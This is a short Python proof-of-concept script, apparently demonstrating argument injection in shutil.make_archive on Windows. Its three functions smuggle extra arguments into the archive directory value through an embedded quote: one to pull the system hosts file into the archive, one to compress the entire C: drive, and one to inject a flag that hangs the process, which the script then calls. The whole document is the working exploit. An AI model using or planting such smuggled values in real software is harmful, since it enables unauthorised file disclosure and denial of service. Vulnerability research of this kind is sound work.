from shutil import make_archive


# Leaking arbitrary file from the system
def information_leak():
	make_archive('archive', 'zip', '.', 'testdir" "C:\\Windows\\System32\\drivers\\etc\\hosts')

# Trying to compress the entire drive
def denial_of_service():
	make_archive('archive', 'zip', '.', 'testdir" "C:\\')

# Hanging the calling process
def arbitrary_arguments():
	make_archive('archive', 'zip', '.', 'testdir" --entry-comments "')
arbitrary_arguments()